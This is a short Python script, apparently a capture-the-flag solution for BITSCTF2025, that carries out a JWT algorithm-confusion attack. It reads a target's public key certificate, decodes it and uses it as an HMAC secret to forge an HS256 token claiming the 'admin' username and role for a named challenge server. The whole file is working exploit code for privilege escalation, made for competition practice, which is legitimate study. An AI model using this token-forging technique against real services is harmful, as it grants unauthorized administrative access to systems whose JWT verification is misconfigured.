# alg confusion

import jwt
import base64
import re

url = "http://chals.bitskrieg.in:3005"


with open("/home/nguyenlong05/files/CTFsrccode/BITSCTF2025/public-key.cer", "r") as f:
    pem_data = f.read()

pem_body = re.sub(r"-----.*?-----", "", pem_data, flags=re.DOTALL).strip()

hmac_secret = base64.b64decode(pem_body)

token = jwt.encode(
    {"username": "admin", "role": "admin", "iat": 1749015184}, 
    hmac_secret, 
    algorithm="HS256"
)
print(token)

